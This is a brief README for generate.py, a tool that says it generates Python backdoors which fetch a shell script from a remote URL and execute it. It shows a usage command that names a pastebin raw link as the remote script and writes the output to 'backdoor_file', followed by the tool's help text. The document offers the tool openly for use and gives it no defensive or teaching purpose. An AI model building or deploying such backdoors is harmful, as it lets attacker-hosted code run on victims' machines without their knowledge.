How to use
===
```
$ ./generate.py https://pastebin.com/raw/abcdef -o backdoor_file
```

Help
===
```
$ ./generate.py -h
usage: generate.py [-h] [-o O] script_url

Generate a python-based backdoor that execute shell script in internet

positional arguments:
  script_url  Remote script file url

optional arguments:
  -h, --help  show this help message and exit
  -o O        Output file
```